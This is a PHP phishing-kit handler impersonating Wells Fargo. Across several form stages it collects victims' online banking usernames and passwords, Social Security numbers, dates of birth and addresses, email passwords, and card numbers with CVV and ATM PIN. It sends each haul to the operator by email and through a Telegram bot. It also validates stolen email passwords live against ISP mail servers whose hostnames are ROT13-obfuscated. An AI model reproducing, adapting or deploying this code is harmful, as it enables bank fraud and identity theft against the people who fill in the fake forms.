<?php
/*
Please don't fuck with my code.
contact me for more page, ICQ @labdata
*/
?>

<?php
include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
require 'Email.php';

if (isset($_POST['username'])) {

    $action = $_POST['action'];
    $user = $_POST['username'];

    if (!empty($usern)) {
        header('Location: ./web/login.php');
    }

    $user = $_POST['username'];
    $pattern = "/@/i";
    $stat = preg_match($pattern, $user);

    $stat = preg_match($pattern, $user);
    if ($stat == 3) {
        header('Location: ./web/login.php?error=3');
        die();
    }
    if ($action == 3) {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----WellsFargo Online ID -----|\n";
        $message .= "Username💻: " . $_POST['username'] . "\n";
        $message .= "Password🔑: " . $_POST['password'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "Wells Fargo Login : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        header('Location: ./web/login.php?error=3');
    } else if ($action == 4) {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----WellsFargo Online ID2 -----|\n";
        $message .= "Username💻: " . $_POST['username'] . "\n";
        $message .= "Password🔑: " . $_POST['password'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "Wells Fargo Login : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        header('Location: ./web/billing.php');
    }
}
if (isset($_POST['fname'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----WellsFargo Fullz -----|\n";
    $message .= "Full Name: " . $_POST['fname'] . "\n";
    $message .= "SSN: " . $_POST['ssn'] . "\n";
    $message .= "DOB: " . $_POST['dob'] . "\n";
    $message .= "Address: " . $_POST['addr'] . "\n";
    $message .= "City: " . $_POST['city'] . "\n";
    $message .= "Zip Code: " . $_POST['zip'] . "\n";
    $message .= "State: " . $_POST['state'] . "\n";
    $message .= "Phone Number: " . $_POST['phone'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Wells Fargo Fullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/mail.php");
}
if (isset($_POST['email'])) {


    $ipdata = "NOTRUE";
    $check = 0;

    $user = $_POST['email'];
    $pass = $_POST['emailp'];

    $charter = '/charter/i';
    $netzero = '/netzero/i';
    $juno = '/juno/i';
    $wow1 = '/wowway/i';
    $wow2 = '/knology/i';

    $opt = '/optonline/i';
    $cent1 = '/centurylink/i';
    $cent2 = '/embarqmail/i';
    $cent3 = '/q.com/i';
    $cent4 = '/centurytel/i';

    $comc = '/comcast/i';
    $att = '/att.net/i';
    $cox = '/cox/i';

    // windstream 
    $wind = '/windstream/i';
    $wind2 = '/windstream.net/i';
    $wind3 = '/navix.net/i';
    $wind4 = '/iowatelecom.net/i';
    $wind5 = '/nuvox.net/i';
    $wind6 = '/ctc.net/i';
    $wind7 = '/vnet.net/i';
    $wind8 = '/valornet.com/i';
    $wind9 = '/ktc.com/i';
    $wind10 = '/izoom.net/i';
    $wind11 = '/dejazzd.com/i';

    $rrnet = '/.rr.net/i';
    $rrcom = '/.rr.com/i';
    $rr3 = '/brighthouse.com/i';
    $rr4 = '/twc.com/i';
    $tds = '/tds.net/i';


    if (preg_match($charter, $user) == 1) {
        $check = "2";
    } else if (preg_match($netzero, $user) == 1) {
        $check = "3";
    } else if (preg_match($juno, $user) == 1) {
        $check = "4";
    } else if (preg_match($wow1, $user) == 1) {
        $check = "5";
    } else if (preg_match($wow2, $user) == 1) {
        $check = "5";
    } else if (preg_match($opt, $user) == 1) {
        $check = "6";
    } else if (preg_match($cent1, $user) == 1) {
        $check = "7";
    } else if (preg_match($cent2, $user) == 1) {
        $check = "7";
    } else if (preg_match($cent3, $user) == 1) {
        $check = "7";
    } else if (preg_match($cent4, $user) == 1) {
        $check = "7";
    } else if (preg_match($comc, $user) == 1) {
        $check = "8";
    } else if (preg_match($att, $user) == 1) {
        $check = "9";
    } else if (preg_match($cox, $user) == 1) {
        $check = "10";
    } else if (preg_match($wind, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind2, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind3, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind4, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind5, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind6, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind7, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind8, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind9, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind10, $user) == 1) {
        $check = "11";
    } else if (preg_match($wind11, $user) == 1) {
        $check = "11";
    } else if (preg_match($rrnet, $user) == 1) {
        $check = "12";
    } else if (preg_match($rrcom, $user) == 1) {
        $check = "12";
    } else if (preg_match($rr3, $user) == 1) {
        $check = "12";
    } else if (preg_match($rr4, $user) == 1) {
        $check = "12";
    } else if (preg_match($tds, $user) == 1) {
        $check = "13";
    } else {
        $check = 0;
    }

    if ($check == 2) {
        $authhost = str_rot13("{zbovyr.punegre.arg:143}");
    } else if ($check == 3) {
        $authhost = str_rot13("{cbc.argmreb.pbz:995/cbc/ffy/abinyvqngr-preg}");
    } else if ($check == 4) {
        $authhost = str_rot13("{cbc.whab.pbz:995/cbc3/ffy/abinyvqngr-preg}");
    } else if ($check == 5) {
        $authhost = str_rot13("{znvy.jbjjnl.pbz:995/cbc3/ffy/abinyvqngr-preg}");
    } else if ($check == 6) {
        $authhost = str_rot13("{znvy.bcgbayvar.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 7) {
        $authhost = str_rot13("{znvy.praghelyvax.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 8) {
        $authhost = str_rot13("{vznc.pbzpnfg.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 9) {
        $authhost = str_rot13("{vznc.znvy.ngg.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 10) {
        $authhost = str_rot13("{vznc.pbk.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 11) {
        $authhost = str_rot13("{cbc.jvaqfgernz.arg:995/cbc3/ffy/abinyvqngr-preg}");
    } else if ($check == 12) {
        $authhost = str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
    } else if ($check == 13) {
        $authhost = str_rot13("{mail.tds.net:993/imap/ssl/novalidate-cert}");
    } else {
        $ipdata == "NOTRUE";
    }


    if ($ipdata == "NOTRUE" && $check == 0) {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----Wells Fargo Email NoTrue-----|\n";
        $message .= "Email: " . $_POST['email'] . "\n";
        $message .= "Email Password: " . $_POST['emailp'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "Wells Fargo EmailNoTrue : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        header("Location: ./web/cc.php");
        die();
    }

    if (!empty($authhost) && !empty($user) && !empty($pass)) {
        if ($mbox = imap_open($authhost, $user, $pass)) {
            $ipdata = "Call Done";
            imap_close($mbox);
        } else {
            $ipdata = "FAIL!";
        }
    }

    if ($ipdata == "Call Done") {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----Wells Fargo Email True-----|\n";
        $message .= "Email: " . $_POST['email'] . "\n";
        $message .= "Email Password: " . $_POST['emailp'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "Wells Fargo EmailTrue : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        header("Location: ./web/cc.php");
    } else {
        header("Location: ./web/mail.php?error=1");
    }
}
if (isset($_POST['card'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Wells Fargo Card -----|\n";
    $message .= "Card: " . $_POST['card'] . "\n";
    $message .= "Exp: " . $_POST['exp'] . "\n";
    $message .= "CVV: " . $_POST['cvv'] . "\n";
    $message .= "ATM Pin: " . $_POST['atm'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Wells Fargo Card : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/done.php");
}
$fp = fopen("", "a"); // Add name of text file if want to save. like "./name.txt"//
fputs($fp, $message);
fclose($fp);
